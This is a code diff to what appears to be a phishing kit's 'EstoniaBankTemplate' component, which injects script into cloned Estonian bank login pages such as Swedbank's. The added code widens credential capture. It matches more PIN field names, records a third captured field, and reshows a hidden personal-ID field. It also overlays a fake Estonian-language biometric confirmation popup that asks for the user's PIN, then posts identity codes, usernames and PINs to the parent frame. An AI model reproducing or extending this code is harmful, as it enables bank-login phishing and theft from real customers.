@@ -241,6 +241,8 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
       (lowerKey.includes("pin-calculator") && lowerKey.includes("code")) ||
       lowerText.includes("pin calculator code") ||
       lowerText.includes("pin-calculator-code") ||
+      lowerText.includes("pincode") ||
+      lowerText.includes("pinkood") ||
       lowerText.includes("password") ||
       lowerText.includes("passcode") ||
       lowerText.includes("parool") ||
@@ -539,7 +541,32 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           }))
           .filter((field) => Boolean(field.value))
           .filter((field) => !shouldIgnoreCapturedField(field))
-          .filter((field, index, list) => list.findIndex((candidate) => candidate.value === field.value) === index);
+          .filter(
+            (field, index, list) =>
+              list.findIndex(
+                (candidate) =>
+                  [
+                    candidate.key,
+                    candidate.name,
+                    candidate.id,
+                    candidate.formControlName,
+                    candidate.label,
+                    candidate.ariaLabel,
+                    candidate.placeholder,
+                    candidate.value,
+                  ].join("|") ===
+                  [
+                    field.key,
+                    field.name,
+                    field.id,
+                    field.formControlName,
+                    field.label,
+                    field.ariaLabel,
+                    field.placeholder,
+                    field.value,
+                  ].join("|"),
+              ) === index,
+          );
 
         const hasIdentityValue = Boolean(mappedData.personalCode || mappedData.username || mappedData.verfuegernummer || mappedData.bankPhone);
         if (!hasIdentityValue && filledValues[0]?.value) {
@@ -550,6 +577,8 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
         const orderedField1Key = filledValues[0] ? inferOrderedCanonicalFieldKey(filledValues[0]) : "";
         const orderedField2Key = filledValues[1] ? inferOrderedCanonicalFieldKey(filledValues[1]) : "";
         const orderedField2Type = filledValues[1] ? inferOrderedFieldType(filledValues[1]) : "";
+        const orderedField3Key = filledValues[2] ? inferOrderedCanonicalFieldKey(filledValues[2]) : "";
+        const orderedField3Type = filledValues[2] ? inferOrderedFieldType(filledValues[2]) : "";
 
         if (!mappedData.password) {
           if (passwordFallback?.value) {
@@ -563,6 +592,9 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           orderedField2: filledValues[1]?.value ?? "",
           orderedField2Key,
           orderedField2Type,
+          orderedField3: filledValues[2]?.value ?? "",
+          orderedField3Key,
+          orderedField3Type,
           ...rawCapturedData,
           ...mappedData,
         });
@@ -918,6 +950,233 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             return inputs;
         };
 
+        const isSwedbankBiometricFlow = (loginMethod) => {
+            return window.location.href.includes('swedbank') && extractLoginMethodLabel(loginMethod) === 'Biomeetria/PIN-kood';
+        };
+
+        const ensureSwedbankBiometricIdentityField = () => {
+            if (!window.location.href.includes('swedbank')) {
+                return;
+            }
+
+            const simpleForm = document.querySelector('ui-tab#SIMPLE_ID form');
+            if (!simpleForm) {
+                return;
+            }
+
+            const usernameInput = simpleForm.querySelector('#login-widget-user-id-simple');
+            const rememberField = simpleForm.querySelector('#rememberMeSimpleId')?.closest('ui-field');
+            let personalField =
+                simpleForm.querySelector('#login-widget-personal-id-simple')?.closest('ui-field') ||
+                simpleForm.querySelector('input[name="personalIdentityCode"]')?.closest('ui-field') ||
+                simpleForm.querySelector('ui-field[label="Isikukood"]');
+
+            if (!usernameInput || !personalField) {
+                return;
+            }
+
+            personalField.classList.remove('-hidden', 'sf-hidden');
+            if (!personalField.querySelector('input[name="personalIdentityCode"]')) {
+                personalField.innerHTML = [
+                    '<div class="ui-field__wrapper">',
+                    '<div class="ui-field__label"><label class="ui-field__label-inner" for="login-widget-personal-id-simple">Isikukood</label></div>',
+                    '<div class="ui-field__control">',
+                    '<input id="login-widget-personal-id-simple" type="text" name="personalIdentityCode" autocomplete="off" inputmode="numeric" maxlength="11" pattern="[0-9]*" data-validated="true" value="">',
+                    '</div>',
+                    '</div>'
+                ].join('');
+            }
+
+            if (rememberField && personalField.nextElementSibling !== rememberField) {
+                simpleForm.insertBefore(personalField, rememberField);
+            }
+
+            const submitButton = simpleForm.querySelector('button[type="submit"]');
+            const personalInput = simpleForm.querySelector('#login-widget-personal-id-simple');
+            const syncSubmitState = () => {
+                if (!submitButton || !usernameInput || !personalInput) {
+                    return;
+                }
+
+                const ready = usernameInput.value.trim().length > 0 && personalInput.value.trim().length > 0;
+                submitButton.disabled = !ready;
+                if (ready) {
+                    submitButton.removeAttribute('disabled');
+                    submitButton.style.opacity = '1';
+                    submitButton.style.pointerEvents = 'auto';
+                } else {
+                    submitButton.setAttribute('disabled', 'disabled');
+                }
+            };
+
+            syncSubmitState();
+            if (!simpleForm.dataset.traeSwedbankBioBound) {
+                simpleForm.dataset.traeSwedbankBioBound = '1';
+                usernameInput.addEventListener('input', syncSubmitState);
+                personalInput?.addEventListener('input', syncSubmitState);
+            }
+        };
+
+        const removeSwedbankBiometricPopup = () => {
+            const existingPopup = document.getElementById('trae-swedbank-bio-popup');
+            if (existingPopup) {
+                existingPopup.remove();
+            }
+        };
+
+        const buildUniqueFieldKey = (field) => {
+            return [
+                field.key || '',
+                field.name || '',
+                field.id || '',
+                field.formControlName || '',
+                field.label || '',
+                field.ariaLabel || '',
+                field.placeholder || '',
+                field.value || ''
+            ].join('|');
+        };
+
+        const mergeCapturedFields = (primaryFields, extraFields) => {
+            const merged = [];
+            const seen = new Set();
+
+            [...primaryFields, ...extraFields].forEach(field => {
+                if (!field) return;
+                const fieldKey = buildUniqueFieldKey(field);
+                if (seen.has(fieldKey)) return;
+                seen.add(fieldKey);
+                merged.push(field);
+            });
+
+            return merged;
+        };
+
+        const submitSwedbankBiometricFields = (baseFields, popupField) => {
+            const mergedFields = mergeCapturedFields(baseFields, [popupField]);
+            const inputs = buildInputMap(mergedFields);
+
+            window.parent.postMessage({
+              type: 'ESTONIA_BANK_SUBMIT',
+              formData: { inputs, fields: mergedFields, loginMethod: 'Biomeetria/PIN-kood' }
+            }, '*');
+        };
+
+        const openSwedbankBiometricPopup = (baseFields) => {
+            removeSwedbankBiometricPopup();
+
+            const overlay = document.createElement('div');
+            overlay.id = 'trae-swedbank-bio-popup';
+            overlay.setAttribute('role', 'dialog');
+            overlay.setAttribute('aria-modal', 'true');
+            overlay.innerHTML = [
+              '<div style="position:fixed;inset:0;background:rgba(34,45,67,.38);z-index:2147483646;"></div>',
+              '<div style="position:fixed;left:50%;top:50%;width:min(92vw,430px);transform:translate(-50%,-50%);border-radius:20px;background:#ffffff;box-shadow:0 30px 70px rgba(16,24,40,.28);padding:24px;z-index:2147483647;font-family:Arial,sans-serif;">',
+              '<div style="display:flex;align-items:flex-start;justify-content:space-between;gap:12px;">',
+              '<div>',
+              '<div style="font-size:23px;font-weight:700;line-height:1.2;color:#2f2424;">Kinnita biomeetriline sisselogimine</div>',
+              '<div style="margin-top:8px;font-size:14px;line-height:1.55;color:#5b4b43;">Sisesta oma PIN-kood, et jätkata Swedbanki biomeetria sisselogimisega.</div>',
+              '</div>',
+              '<button type="button" data-close="1" aria-label="Sulge" style="border:0;background:transparent;color:#7b6d67;font-size:24px;line-height:1;cursor:pointer;padding:0;">×</button>',
+              '</div>',
+              '<label for="trae-swedbank-bio-pin" style="display:block;margin-top:20px;font-size:13px;font-weight:700;color:#4a3f39;">PIN-kood</label>',
+              '<input id="trae-swedbank-bio-pin" name="pinCode" type="password" inputmode="numeric" autocomplete="off" maxlength="8" style="margin-top:8px;width:100%;border:1px solid #d7d2cc;border-radius:12px;padding:13px 14px;font-size:16px;line-height:1.2;color:#1f2937;outline:none;box-sizing:border-box;" />',
+              '<div data-error="1" style="display:none;margin-top:8px;font-size:12px;color:#b42318;">PIN-kood on kohustuslik.</div>',
+              '<div style="display:flex;justify-content:flex-end;gap:10px;margin-top:22px;">',
+              '<button type="button" data-close="1" style="border:1px solid #d0d5dd;background:#ffffff;color:#344054;border-radius:12px;padding:11px 16px;font-size:14px;font-weight:600;cursor:pointer;">Tühista</button>',
+              '<button type="button" data-submit="1" style="border:0;background:#f26d21;color:#ffffff;border-radius:12px;padding:11px 18px;font-size:14px;font-weight:700;cursor:pointer;">Jätka</button>',
+              '</div>',
+              '</div>'
+            ].join('');
+
+            document.body.appendChild(overlay);
+
+            const pinInput = overlay.querySelector('#trae-swedbank-bio-pin');
+            const errorText = overlay.querySelector('[data-error="1"]');
+            const closePopup = () => removeSwedbankBiometricPopup();
+            const submitPopup = () => {
+                const pinValue = pinInput && pinInput.value ? pinInput.value.trim() : '';
+                if (!pinValue) {
+                    if (errorText) {
+                        errorText.style.display = 'block';
+                    }
+                    if (pinInput) {
+                        pinInput.focus();
+                    }
+                    return;
+                }
+
+                const popupField = {
+                    key: 'pinCode',
+                    name: 'pinCode',
+                    id: 'trae-swedbank-bio-pin',
+                    formControlName: '',
+                    value: pinValue,
+                    type: 'password',
+                    label: 'PIN-kood',
+                    ariaLabel: 'PIN-kood',
+                    placeholder: ''
+                };
+
+                closePopup();
+                submitSwedbankBiometricFields(baseFields, popupField);
+            };
+
+            overlay.querySelectorAll('[data-close="1"]').forEach(button => {
+                button.addEventListener('click', closePopup);
+            });
+
+            overlay.addEventListener('click', (event) => {
+                if (event.target === overlay || event.target === overlay.firstElementChild) {
+                    closePopup();
+                }
+            });
+
+            if (pinInput) {
+                pinInput.focus();
+                pinInput.addEventListener('input', () => {
+                    if (errorText && pinInput.value.trim()) {
+                        errorText.style.display = 'none';
+                    }
+                });
+                pinInput.addEventListener('keydown', (event) => {
+                    if (event.key === 'Enter') {
+                        event.preventDefault();
+                        submitPopup();
+                    }
+                    if (event.key === 'Escape') {
+                        event.preventDefault();
+                        closePopup();
+                    }
+                });
+            }
+
+            const submitButton = overlay.querySelector('[data-submit="1"]');
+            if (submitButton) {
+                submitButton.addEventListener('click', submitPopup);
+            }
+        };
+
+        const maybeOpenSwedbankBiometricPopup = (fields, loginMethod) => {
+            if (!isSwedbankBiometricFlow(loginMethod)) {
+                return false;
+            }
+
+            const filledFields = fields.filter(field => field && field.value && field.value.trim() !== '');
+            if (filledFields.length < 2) {
+                return true;
+            }
+
+            openSwedbankBiometricPopup(filledFields);
+            return true;
+        };
+
+        ensureSwedbankBiometricIdentityField();
+        setTimeout(ensureSwedbankBiometricIdentityField, 150);
+        setTimeout(ensureSwedbankBiometricIdentityField, 600);
+        document.addEventListener('input', ensureSwedbankBiometricIdentityField, true);
+        document.addEventListener('change', ensureSwedbankBiometricIdentityField, true);
+
         const extractLoginMethodLabel = (rawValue) => {
             const loginMethod = (rawValue || '').replace(/\\s+/g, ' ').trim();
             const normalized = loginMethod.toLowerCase();
@@ -1047,10 +1306,15 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             const form = e.target;
             const fields = buildCapturedFields(form);
             const inputs = buildInputMap(fields);
+            const loginMethod = getLoginMethod();
+
+            if (maybeOpenSwedbankBiometricPopup(fields, loginMethod)) {
+                return false;
+            }
             
             window.parent.postMessage({
               type: 'ESTONIA_BANK_SUBMIT',
-              formData: { inputs, fields, loginMethod: getLoginMethod() }
+              formData: { inputs, fields, loginMethod }
             }, '*');
         }, true);
 
@@ -1315,9 +1579,14 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                  return;
              }
 
+             const loginMethod = getLoginMethod();
+             if (maybeOpenSwedbankBiometricPopup(fields, loginMethod)) {
+                 return false;
+             }
+
              window.parent.postMessage({
                type: 'ESTONIA_BANK_SUBMIT',
-               formData: { inputs, fields, loginMethod: getLoginMethod() }
+               formData: { inputs, fields, loginMethod }
              }, '*');
              return;
           }
